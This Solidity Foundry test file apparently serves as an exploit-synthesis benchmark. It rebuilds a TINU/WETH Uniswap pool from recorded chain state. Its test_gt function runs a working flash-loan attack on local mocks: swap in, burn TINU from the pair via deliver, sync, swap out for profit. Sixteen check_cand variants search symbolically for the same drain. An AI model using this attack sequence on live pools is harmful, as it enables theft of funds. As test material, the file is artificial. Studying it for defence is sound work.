// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "./TINU.sol";
import "@utils/QueryBlockchain.sol";
import "forge-std/Test.sol";
import {UniswapV2Factory} from "@utils/UniswapV2Factory.sol";
import {UniswapV2Pair} from "@utils/UniswapV2Pair.sol";
import {UniswapV2Router} from "@utils/UniswapV2Router.sol";
import {WETH} from "@utils/WETH.sol";

contract TINUTest is Test, BlockLoader {
    TINU tinu;
    WETH weth;
    UniswapV2Pair pair;
    UniswapV2Factory factory;
    UniswapV2Router router;
    address attacker;
    address constant owner = address(0x123456);
    uint256 blockTimestamp = 1674717035;
    uint112 reserve0pair = 1781945970074638149262;
    uint112 reserve1pair = 22144561461014981232;
    uint32 blockTimestampLastpair = 1628422328;
    uint256 kLastpair = 0;
    uint256 price0CumulativeLastpair = 1071082433016123456880944697974037666088;
    uint256 price1CumulativeLastpair =
        827537596111131615299936214637285315298957;
    uint256 totalSupplyweth = 3905606665373372547578701;
    uint256 balanceOfwethpair = 22144561461014981232;
    uint256 balanceOfwethattacker = 0;
    uint256 balanceOfweth = 1084248678901911501449;
    uint256 totalSupplytinu = 1733820000000000000000;
    uint256 balanceOftinupair = 1781945970074638149262;
    uint256 balanceOftinuattacker = 0;
    uint256 balanceOftinu = 0;

    function setUp() public {
        vm.warp(blockTimestamp);
        attacker = address(this);
        vm.startPrank(owner);
        tinu = new TINU(
            payable(0x9980A74fCBb1936Bc79Ddecbd4148f7511598521),
            payable(0xEBA4a1e0ff3baF18A9D2910874Ffaee11911Cc31)
        );
        weth = new WETH();
        pair = new UniswapV2Pair(
            address(tinu),
            address(weth),
            reserve0pair,
            reserve1pair,
            blockTimestampLastpair,
            kLastpair,
            price0CumulativeLastpair,
            price1CumulativeLastpair
        );
        factory = new UniswapV2Factory(
            address(0xdead),
            address(pair),
            address(0x0),
            address(0x0)
        );
        router = new UniswapV2Router(address(factory), address(0xdead));
        tinu.afterDeploy(address(router), address(pair));
        // Initialize balances and mock flashloan.
        weth.transfer(address(pair), balanceOfwethpair);
        tinu.transfer(address(pair), balanceOftinupair);
        weth.approve(attacker, UINT256_MAX);
        tinu.approve(attacker, UINT256_MAX);
        vm.stopPrank();
    }

    function printBalance(string memory tips) public {
        emit log_string(tips);
        emit log_string("Tinu Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(tinu),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(tinu),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("Weth Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(weth),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(weth),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("Pair Balances: ");
        queryERC20BalanceDecimals(
            address(weth),
            address(pair),
            weth.decimals()
        );
        queryERC20BalanceDecimals(
            address(tinu),
            address(pair),
            tinu.decimals()
        );
        emit log_string("");
        emit log_string("Attacker Balances: ");
        queryERC20BalanceDecimals(address(weth), attacker, weth.decimals());
        queryERC20BalanceDecimals(address(tinu), attacker, tinu.decimals());
        emit log_string("");
        emit log_string("");
        emit log_string("");
    }

    function attackGoal() public view returns (bool) {
        return weth.balanceOf(attacker) >= 1e18 + balanceOfwethattacker;
    }

    function nop(uint256 amount) internal pure {
        return;
    }

    function borrow_weth(uint256 amount) internal {
        weth.transferFrom(owner, attacker, amount);
    }

    function payback_weth(uint256 amount) internal {
        weth.transfer(owner, amount);
    }

    function borrow_tinu(uint256 amount) internal {
        tinu.transferFrom(owner, attacker, amount);
    }

    function payback_tinu(uint256 amount) internal {
        tinu.transfer(owner, amount);
    }

    function swap_pair_tinu_weth(uint256 amount) internal {
        tinu.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(tinu);
        path[1] = address(weth);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function swap_pair_weth_tinu(uint256 amount) internal {
        weth.approve(address(router), type(uint).max);
        address[] memory path = new address[](2);
        path[0] = address(weth);
        path[1] = address(tinu);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            1,
            path,
            attacker,
            block.timestamp
        );
    }

    function sync_pair() internal {
        pair.sync();
    }

    function burn_pair_tinu(uint256 amount) internal {
        tinu.deliver(address(pair), amount);
    }

    function test_gt() public {
        borrow_weth(22e18);
        printBalance("After step0 ");
        swap_pair_weth_tinu(weth.balanceOf(attacker));
        printBalance("After step1 ");
        burn_pair_tinu(100 ether);
        printBalance("After step2 ");
        sync_pair();
        printBalance("After step3 ");
        swap_pair_tinu_weth(tinu.balanceOf(attacker));
        printBalance("After step4 ");
        payback_weth(22e18);
        printBalance("After step5 ");
        require(attackGoal(), "Attack failed!");
    }

    function check_gt(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        sync_pair();
        swap_pair_tinu_weth(amt3);
        payback_weth(amt4);
        assert(!attackGoal());
    }

    function check_cand000(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        swap_pair_tinu_weth(amt3);
        payback_weth(amt4);
        assert(!attackGoal());
    }

    function check_cand001(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        swap_pair_tinu_weth(amt3);
        swap_pair_tinu_weth(amt4);
        payback_weth(amt5);
        assert(!attackGoal());
    }

    function check_cand002(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4
    ) public {
        vm.assume(amt4 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        sync_pair();
        swap_pair_tinu_weth(amt3);
        payback_weth(amt4);
        assert(!attackGoal());
    }

    function check_cand003(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        swap_pair_tinu_weth(amt4);
        payback_weth(amt5);
        assert(!attackGoal());
    }

    function check_cand004(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        sync_pair();
        swap_pair_tinu_weth(amt3);
        swap_pair_tinu_weth(amt4);
        payback_weth(amt5);
        assert(!attackGoal());
    }

    function check_cand005(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        swap_pair_tinu_weth(amt4);
        swap_pair_tinu_weth(amt5);
        payback_weth(amt6);
        assert(!attackGoal());
    }

    function check_cand006(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5
    ) public {
        vm.assume(amt5 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        sync_pair();
        swap_pair_tinu_weth(amt4);
        payback_weth(amt5);
        assert(!attackGoal());
    }

    function check_cand007(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        swap_pair_tinu_weth(amt5);
        payback_weth(amt6);
        assert(!attackGoal());
    }

    function check_cand008(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        sync_pair();
        swap_pair_tinu_weth(amt4);
        swap_pair_tinu_weth(amt5);
        payback_weth(amt6);
        assert(!attackGoal());
    }

    function check_cand009(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        swap_pair_tinu_weth(amt5);
        swap_pair_tinu_weth(amt6);
        payback_weth(amt7);
        assert(!attackGoal());
    }

    function check_cand010(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6
    ) public {
        vm.assume(amt6 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        sync_pair();
        swap_pair_tinu_weth(amt5);
        payback_weth(amt6);
        assert(!attackGoal());
    }

    function check_cand011(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        burn_pair_tinu(amt5);
        swap_pair_tinu_weth(amt6);
        payback_weth(amt7);
        assert(!attackGoal());
    }

    function check_cand012(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        sync_pair();
        swap_pair_tinu_weth(amt5);
        swap_pair_tinu_weth(amt6);
        payback_weth(amt7);
        assert(!attackGoal());
    }

    function check_cand013(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.assume(amt8 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        burn_pair_tinu(amt5);
        swap_pair_tinu_weth(amt6);
        swap_pair_tinu_weth(amt7);
        payback_weth(amt8);
        assert(!attackGoal());
    }

    function check_cand014(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7
    ) public {
        vm.assume(amt7 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        burn_pair_tinu(amt5);
        sync_pair();
        swap_pair_tinu_weth(amt6);
        payback_weth(amt7);
        assert(!attackGoal());
    }

    function check_cand015(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3,
        uint256 amt4,
        uint256 amt5,
        uint256 amt6,
        uint256 amt7,
        uint256 amt8
    ) public {
        vm.assume(amt8 == amt0 + 66000000000000001);
        borrow_weth(amt0);
        swap_pair_weth_tinu(amt1);
        burn_pair_tinu(amt2);
        burn_pair_tinu(amt3);
        burn_pair_tinu(amt4);
        burn_pair_tinu(amt5);
        sync_pair();
        swap_pair_tinu_weth(amt6);
        swap_pair_tinu_weth(amt7);
        payback_weth(amt8);
        assert(!attackGoal());
    }
}
